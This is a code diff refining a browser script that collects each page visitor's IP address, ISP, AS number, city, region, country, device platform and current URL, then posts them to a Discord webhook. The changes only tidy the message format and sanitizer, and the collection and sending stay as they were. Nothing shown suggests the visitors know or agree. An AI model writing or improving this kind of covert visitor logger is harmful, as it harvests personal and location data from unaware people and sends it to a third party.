@@ -45,9 +45,12 @@
     }
   }
 
+  // sanitizer now preserves line breaks
   function sanitizeForDiscord(s, max = 1900) {
     if (!s) return "";
-    const cleaned = s.replace(/[`*_~>|]/g, "").replace(/[^\p{L}\p{N} .,!?'"()\[\]{}\-_/]/gu, "");
+    const cleaned = s
+      .replace(/[`*_~>|]/g, "") // remove markdown
+      .replace(/[^\p{L}\p{N}\n .,!?'"()\[\]{}\-_/]/gu, ""); // allow line breaks
     return cleaned.length > max ? cleaned.slice(0, max) + "\n\n...truncated" : cleaned;
   }
 
@@ -56,12 +59,13 @@
   const platform = navigator.userAgentData?.platform || navigator.platform || "unknown";
   const baseLocation = location.href;
 
-  const ipMessage = 
-`IP: ${ip || "unknown"}
-ISP: ${ispInfo.isp || "unknown"}${ispInfo.org ? ` (${ispInfo.org})` : ""}${ispInfo.as ? ` AS${ispInfo.as}` : ""}
-Location: ${ispInfo.city ? ispInfo.city + ", " : ""}${ispInfo.region ? ispInfo.region + ", " : ""}${ispInfo.country || ""}
-Device: ${platform}
-Site: ${baseLocation}`;
+  const ipMessage = [
+    `IP: ${ip || "unknown"}`,
+    `ISP: ${ispInfo.isp || "unknown"}${ispInfo.org ? ` (${ispInfo.org})` : ""}${ispInfo.as ? ` AS${ispInfo.as}` : ""}`,
+    `Location: ${ispInfo.city || "unknown"}${ispInfo.region ? ", " + ispInfo.region : ""}${ispInfo.country ? ", " + ispInfo.country : ""}`,
+    `Device: ${platform}`,
+    `Site: ${baseLocation}`
+  ].join("\n");
 
   await sendToDiscord(webhookUrl, sanitizeForDiscord(ipMessage));
 
@@ -95,8 +99,7 @@ Site: ${baseLocation}`;
     if (headline) safeSendHeadline(headline);
   });
 
-  // MutationObserver left only to watch for dynamic changes if needed
-  // But it no longer sends headlines automatically
+  // MutationObserver kept empty to avoid false triggers
   const observer = new MutationObserver(() => {});
   observer.observe(document.documentElement || document.body, { childList: true, subtree: true });
   window.addEventListener("beforeunload", () => observer.disconnect());
